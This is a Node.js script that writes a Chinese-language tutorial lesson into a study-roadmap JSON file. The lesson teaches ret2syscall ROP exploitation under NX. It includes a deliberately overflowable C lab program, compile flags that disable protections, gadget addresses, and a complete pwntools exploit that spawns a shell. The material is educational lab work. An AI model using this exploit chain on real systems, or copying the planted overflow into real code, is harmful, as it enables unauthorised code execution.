import fs from 'fs';

const file = 'C:/Users/LLZY2/.roadmap-skill/projects/proj_1792501168121_wfulv9v.json';
const d = JSON.parse(fs.readFileSync(file, 'utf-8'));
const t = d.tasks.find(x => x.id === 'pwn_2_2_rop_ret2syscall');

t.description = `# 🎯 节点 2.2：突破 NX 拦截：ROP 导向编程与系统调用链 (ret2syscall)

> **知识沉淀**：数据不可执行下拼接代码片段 (Gadgets)。利用 syscall 汇编指令手工配置寄存器发起 Linux 内核系统调用。

---

## 一、 场景矛盾与第一性原理（为什么要有 ROP？）

### 1. 昔日荣光与时代的终结（Shellcode 的死穴）
在没有防御的时代，黑客的利用方式粗暴直接：
1. 在栈上的局部变量 \`buf\` 中塞入一段准备好的机器码（Shellcode）；
2. 覆盖返回地址，直接跳到 \`buf\` 所在的栈地址，CPU 顺流而下直接跑机器指令。

但是，操作系统引入了 **NX / DEP（数据执行保护 / No-Execute）**：
- **硬件铁律**：操作系统在 CPU 页表项中将内存的“写”与“执行”严格互斥——**栈（Stack）和堆（Heap）被标记为 \`rw-\`（可读写，但不可执行！）**。
- **死亡拦截**：黑客即便能把一段完美无瑕的机器码写进栈里，一旦把 \`RIP\` 指针跳到栈地址，CPU MMU 硬件立刻报段错误（Segmentation fault），操作系统瞬间杀死进程。

---

### 2. 破局哲学：借刀杀人（从“创造指令”到“拼装零件”）
**既然我们无法在栈上“创造并执行代码”，那我们能不能“利用程序本身原本就允许执行的代码”？**
- 编译好的二进制程序代码段（\`.text\`）具有天然合法的可执行权限（\`r-x\`）。
- 在这段可执行代码中，散落着大量以 \`ret\` 指令结尾的短小汇编片段，例如：
  \`pop rdi; ret\`
  \`pop rax; ret\`
  \`pop rsi; pop rdx; ret\`
- 黑客将这些以 \`ret\` 结尾的汇编碎片称为 **Gadget（代码零件）**。
- **ROP（Return-Oriented Programming，面向返回编程）的核心心智**：
  **既然栈段不能执行代码，我们就把栈纯粹当成“数据托盘”！我们在栈上放满一个个现成 Gadget 的内存地址与传参数值。利用函数结尾自带的 \`ret\` 弹出第一个零件，每一个零件做完事情后又以 \`ret\` 弹出下一个零件——像弹珠机一样在代码段来回弹射，在不执行栈上任何代码的前提下，完全达成图灵完备的任意攻击控制！**

---

## 二、 经典靶场 C 源码与编译参数

为了彻底剔除外界动态库的干扰，让我们纯粹专注于攻坚 NX 保护下的 **ret2syscall**，我们设计以下靶场源码：

\`\`\`c
// 靶场源码：syscall_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// BSS 段未初始化全局变量（物理地址固定、可写、不被随机化）
char global_buf[0x100]; 

void vuln() {
    char buf[32]; // 局部变量仅 32 字节
    
    puts("Stage 1: Write something to global buffer:");
    read(0, global_buf, 0x100); // 允许先向全局 BSS 段写入 256 字节数据（如写入 "/bin/sh"）
    
    puts("Stage 2: Overflow me with your ROP chain:");
    read(0, buf, 0x100); // 致命漏洞：允许输入 256 字节，严重冲垮 32 字节局部变量与返回地址！
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
\`\`\`

### 编译命令与硬性约束：
\`\`\`bash
gcc -fno-stack-protector -no-pie -static -m64 -o syscall_demo syscall_demo.c
\`\`\`
- \`-fno-stack-protector\`：关闭 Canary 栈保护，专注攻坚 NX。
- \`-no-pie\`：关闭代码段基址随机化，确保代码段 Gadget 与 BSS 段地址是写死的绝对物理地址。
- **\`-static\`（静态编译）**：把 C 语言底层标准库全部编译进单一二进制文件中。这为我们在目标程序内部提供了极其丰富的现成 Gadget（如 \`pop rax\`、\`pop rdi\`、\`syscall\` 等），无需依赖外部 libc 泄露！

---

## 三、 攻坚目标：Linux 64 位 \`execve\` 系统调用规约

在没有现成后门函数的前提下，夺取最高控制权的最直接手法就是**直接呼叫 Linux 内核执行 \`sys_execve("/bin/sh", NULL, NULL)\` 系统调用**！

在 Linux x86_64 架构下，发起系统调用有严苛的硬件寄存器协议：

| 寄存器名称 | 必须装入的数值 | 物理意义说明 |
| :--- | :--- | :--- |
| **\`RAX\`** | **\`59\`**（十六进制 \`0x3b\`） | 64 位 Linux 内核中 \`sys_execve\` 的系统调用编号 |
| **\`RDI\`** | **\`&global_buf\`** | 指向字符串 \`"/bin/sh"\` 的内存绝对地址（第 1 参数） |
| **\`RSI\`** | **\`0\`**（\`NULL\`） | 命令行参数指针数组 \`argv\` 为空（第 2 参数） |
| **\`RDX\`** | **\`0\`**（\`NULL\`） | 环境变量指针数组 \`envp\` 为空（第 3 参数） |
| **触发指令** | **\`syscall\`** | 硬件触发从用户态向内核态切换，执行内核调用 |

---

## 四、 寻找代码零件 (Gadgets) 与栈物理对冲测算

使用 Linux 逆向工具 \`ROPgadget\` 对编译出的二进制进行扫描：
\`\`\`bash
ROPgadget --binary ./syscall_demo --only "pop|ret"
ROPgadget --binary ./syscall_demo --only "syscall"
\`\`\`
我们假设提取到以下 4 个现成的绝对地址：
- \`pop_rax_ret\` = \`0x415664\`（汇编：\`pop rax; ret\`）
- \`pop_rdi_ret\` = \`0x4018ca\`（汇编：\`pop rdi; ret\`）
- \`pop_rsi_ret\` = \`0x4029b8\`（汇编：\`pop rsi; ret\`）
- \`pop_rdx_ret\` = \`0x4017df\`（汇编：\`pop rdx; ret\`）
- \`syscall_ret\` = \`0x4012e3\`（汇编：\`syscall; ret\`）

### 物理空间覆写测算表：

| 内存相对位置 | 占用大小 | 存储内容 | 覆写行为与装配零件 |
| :--- | :--- | :--- | :--- |
| **\`RBP - 0x20\`** | 32 字节 | \`char buf[32]\` 缓冲区 | 填充 32 字节垃圾数据 (\`b"A" * 32\`) |
| **\`RBP - 0x00\`** | 8 字节 | \`Saved RBP\` (父栈帧基址) | 填充 8 字节垃圾数据 (\`b"B" * 8\`) |
| **\`RBP + 0x08\`** | 8 字节 | \`Saved RET\` (返回地址) | **第一跳：\`p64(pop_rax_ret)\`** |
| **\`RBP + 0x10\`** | 8 字节 | 栈顶数据 | **数值：\`p64(59)\`**（给 RAX 准备） |
| **\`RBP + 0x18\`** | 8 字节 | 栈顶数据 | **第二跳：\`p64(pop_rdi_ret)\`** |
| **\`RBP + 0x20\`** | 8 字节 | 栈顶数据 | **数值：\`p64(global_buf)\`**（给 RDI 准备） |
| **\`RBP + 0x28\`** | 8 字节 | 栈顶数据 | **第三跳：\`p64(pop_rsi_ret)\`** |
| **\`RBP + 0x30\`** | 8 字节 | 栈顶数据 | **数值：\`p64(0)\`**（给 RSI 准备） |
| **\`RBP + 0x38\`** | 8 字节 | 栈顶数据 | **第四跳：\`p64(pop_rdx_ret)\`** |
| **\`RBP + 0x40\`** | 8 字节 | 栈顶数据 | **数值：\`p64(0)\`**（给 RDX 准备） |
| **\`RBP + 0x48\`** | 8 字节 | 栈顶数据 | **终结指令：\`p64(syscall_ret)\`** |

---

## 五、 硬件微操作慢动作连续拆解（弹珠机时钟流转）

当 \`vuln()\` 函数执行到结尾准备退出时，CPU 硬件将经历一场行云流水的**多级物理弹珠流转**：

\`\`\`text
初始状态：vuln() 执行结尾指令 ret
当前 RSP 正好指向 Saved RET (地址 0x7fffffffe028)
+------------------------------------+
| pop rax; ret (0x415664)            |  <-- RSP 此时在此！
+------------------------------------+
| 59 (0x3b)                          |
+------------------------------------+
| pop rdi; ret (0x4018ca)            |
+------------------------------------+
| &global_buf (0x4040a0)             |
+------------------------------------+
| ... 后续零件 ...                   |
+------------------------------------+
\`\`\`

### 慢动作第 1 拍：原函数 \`ret\`
- **微操作**：\`pop rip\`（硬件从栈顶弹出 \`0x415664\` 塞给 \`RIP\`，\`RSP = RSP + 8\`）。
- **结果**：CPU 跳转到零件 1（\`pop rax; ret\`），此时 \`RSP\` 稳稳指向下方的数值 \`59\`！

### 慢动作第 2 拍：执行零件 1 的 \`pop rax\`
- **微操作**：从栈顶拿走数值 \`59\` 塞进 **\`RAX\`** 寄存器，\`RSP = RSP + 8\`。
- **紧接着执行 \`ret\`**：从栈顶弹出 \`pop rdi; ret\` 的地址塞进 **\`RIP\`**，\`RSP = RSP + 8\`。
- **结果**：\`RAX = 59\` 配置成功！CPU 跳转进入零件 2，\`RSP\` 此时正对 \`&global_buf\`！

### 慢动作第 3 拍：执行零件 2 的 \`pop rdi\`
- **微操作**：从栈顶拿走 \`&global_buf\` 塞进 **\`RDI\`** 寄存器，\`RSP = RSP + 8\`。
- **紧接着执行 \`ret\`**：从栈顶弹出 \`pop rsi; ret\` 的地址塞进 **\`RIP\`**。
- **结果**：\`RDI = &global_buf\` 配置成功！CPU 进入零件 3。

### 慢动作第 4 拍：零件 3 与 4 连续归零
- 类似地，零件 3 吃掉数值 \`0\` 塞入 **\`RSI\`**；
- 零件 4 吃掉数值 \`0\` 塞入 **\`RDX\`**；
- 零件 4 执行末尾 \`ret\`，从栈顶弹出 **\`syscall_ret\`** 的地址塞入 **\`RIP\`**！

### 慢动作第 5 拍：终极点火 \`syscall\`
- **此时硬件状态盘**：
  \`RAX = 59 (sys_execve)\`
  \`RDI = 0x4040a0 ("/bin/sh\\x00")\`
  \`RSI = 0 (NULL)\`
  \`RDX = 0 (NULL)\`
- **CPU 执行 \`syscall\` 指令**：硬件立刻下发软中断陷入内核态，Linux 内核核验寄存器完全合法，瞬间将当前进程原地替换为 \`/bin/sh\`，一个沉甸甸的 Root Shell 在黑客终端中弹射而出！

---

## 六、 C 语言运行时与 Python Pwntools 交互时序图

\`\`\`text
[ 目标程序 (syscall_demo) ]                         [ 攻客脚本 (exploit.py) ]
          |                                                     |
  puts("Stage 1...") ---------------------------------> 接收 "Stage 1..."
  read(0, global_buf, 0x100) <--- 发送 "/bin/sh\\x00" --- 发送 Stage 1 Payload
  (BSS 段存好 "/bin/sh")                                         |
          |                                                     |
  puts("Stage 2...") ---------------------------------> 接收 "Stage 2..."
  read(0, buf, 0x100) <--- 发送 40字节Padding + ROP --- 发送 Stage 2 Payload
  (栈帧被彻底冲垮)                                               |
  vuln() 执行 ret -------------------------+                    |
          |                                | (触发 ROP 链)      |
          v                                |                    |
  pop rax (59) <---------------------------+                    |
  pop rdi (&global_buf)                                         |
  pop rsi (0)                                                   |
  pop rdx (0)                                                   |
  syscall                                                       |
          |                                                     |
  [ 产生 /bin/sh 交互式控制台 ] <==============================> p.interactive()
\`\`\`

---

## 七、 工业级 Exploit 完整落地脚本

\`\`\`python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 工业级利用脚本：exp_ret2syscall.py
from pwn import *

# 1. 架构与调试级别配置
context(arch='amd64', os='linux', log_level='debug')

# 2. 本地目标程序加载
p = process('./syscall_demo')
elf = ELF('./syscall_demo')

# 3. 提取符号与绝对物理地址 (由于 -no-pie，地址全部固定)
global_buf_addr = elf.symbols['global_buf'] # 自动解析 BSS 段全局变量地址
log.info(f"Target BSS global_buf Address : {hex(global_buf_addr)}")

# 提取通过 ROPgadget 找到的代码零件地址
pop_rax_ret = 0x415664
pop_rdi_ret = 0x4018ca
pop_rsi_ret = 0x4029b8
pop_rdx_ret = 0x4017df
syscall_ret = 0x4012e3

# ==========================================
# 阶段 1：向 BSS 段写入 "/bin/sh\x00" 字符串
# ==========================================
p.recvuntil(b"Stage 1: Write something to global buffer:\n")
# 严谨发送 8 字节并补齐截断符 \x00
p.sendline(b"/bin/sh\x00")
log.success("Successfully wrote '/bin/sh' into BSS段!")

# ==========================================
# 阶段 2：构造精密 ROP 链冲垮栈并劫持系统调用
# ==========================================
p.recvuntil(b"Stage 2: Overflow me with your ROP chain:\n")

offset = 32 + 8 # 32 字节局部变量 buf + 8 字节 Saved RBP = 40 字节

# 使用 flat 精准装配 ROP 托盘
rop_chain = flat([
    pop_rax_ret,
    59,                 # RAX = 59 (sys_execve)
    pop_rdi_ret,
    global_buf_addr,    # RDI = &"/bin/sh"
    pop_rsi_ret,
    0,                  # RSI = 0 (NULL)
    pop_rdx_ret,
    0,                  # RDX = 0 (NULL)
    syscall_ret         # 触发 execve("/bin/sh", 0, 0)
])

payload = b"A" * offset + rop_chain

p.sendline(payload)
log.success("ROP Chain sent! Spawning Shell...")

# ==========================================
# 阶段 3：接管交互式控制权
# ==========================================
p.interactive()
\`\`\`

---

## 📌 知识树全景画布与进度看板

| 编号 | 模块 / 节点 | 核心机制 / 权衡问题 | 状态 | 认知沉淀 / 补丁备注 |
| :--- | :--- | :--- | :---: | :--- |
| **0.1** | 虚拟内存分段模型 | 虚拟地址拓扑、代码/数据/堆/栈段权限 (R/W/X) | \`[v]\` | 物理隔离：代码段 r-x 禁止修改，栈段 rw- 执行受限 (NX 根源) |
| **0.2** | CPU 寄存器与微操作 | RIP 只读本质、RSP/RBP 栈锚定、push/pop/call/ret 微指令 | \`[v]\` | 微操作透视：call 自动压栈 RET，ret 等价于盲目 pop rip |
| **0.3** | 动态链接与 PLT/GOT | 延迟绑定物理流转、GOT 表运行改写与符号泄露 | \`[v]\` | 核心心智：PLT 是查号办事窗口，GOT 是通讯录；读破 ASLR，写换函数 |
| **1.0** | 栈帧劫持 (ret2text) | 栈向下生长 vs 数组向上溢出对冲、MOVAPS 16 字节对齐 | \`[v]\` | 物理本质：call 与 ret 导致的 8 字节错位，垫一个 ret 破除崩溃 |
| **1.1** | 栈迁移 (Stack Pivoting) | 空间受限下伪造 fake stack 与双重 leave; ret 联动 | \`[v]\` | 实战定式：改 RBP 为新家地址，劫持 RET 至 leave; ret，头部留 8 字节给 pop rbp 吃 |
| **2.1** | Canary 防御与绕过 | 栈金丝雀插入机制、\\x00 截断保护、格式化/未截断泄露 | \`[v]\` | 实战定式：覆写末位 \\x00 借 puts/printf 喷出，拼回 \\x00 原样填入绕过 |
| **2.2** | **NX 与 ROP 链构造** | **不可执行下拼接零件 (Gadgets)、ret2syscall 传参** | **\`[>]\`** | **当前攻坚：利用 syscall 手工配置寄存器 (RAX=59, RDI=&binsh, RSI=0, RDX=0)** |
| **2.3** | ASLR/PIE 与 ret2libc | 运行时基址随机化、信息泄露计算 Base、符号解析劫持 | \`[ ]\` | 待推进 |
| **2.4** | RELRO 约束 | Partial vs Full RELRO 机制对 GOT 覆写可行性的硬性封锁 | \`[ ]\` | 待推进 |

- **当前锚点**：节点 2.2（突破 NX 拦截：ROP 导向编程与系统调用链 ret2syscall）
- **下一推进方向**：彻底吃透系统调用手工装配心智模型后，迈入现实中最主流的 **2.3 ret2libc（动态链接库基址泄露与 system 函数调用）**。

---

## 🎯 实验验证清单与交互思考题

在推进至 2.3 之前，请按照以下硬性标准检验对 2.2 节点的物理理解：

1. **为什么在 32 位 Linux 中系统调用号是放进 \`EAX\` 并且使用 \`int 0x80\` 软中断触发（且 execve 的编号是 11），而在 64 位体系下改成了使用专门的硬件指令 \`syscall\` 并且 execve 的编号变成了 59（\`0x3b\`）？**
2. **如果在某个真实的 CTF 题目中，程序没有 Stage 1 让你提前往 BSS 段输入 \`"/bin/sh"\`，而且整个程序内也搜不到 \`"/bin/sh"\` 字符串，黑客该如何在 ROP 链里先塞进一个 \`read(0, bss_addr, 8)\` 的调用把字符串读进去，再无缝衔接跳转执行 \`execve\`？（提示：连续串联两个系统调用）**
`;

fs.writeFileSync(file, JSON.stringify(d, null, 2), 'utf-8');
console.log('Successfully updated 2.2 courseware to masterclass quality!');
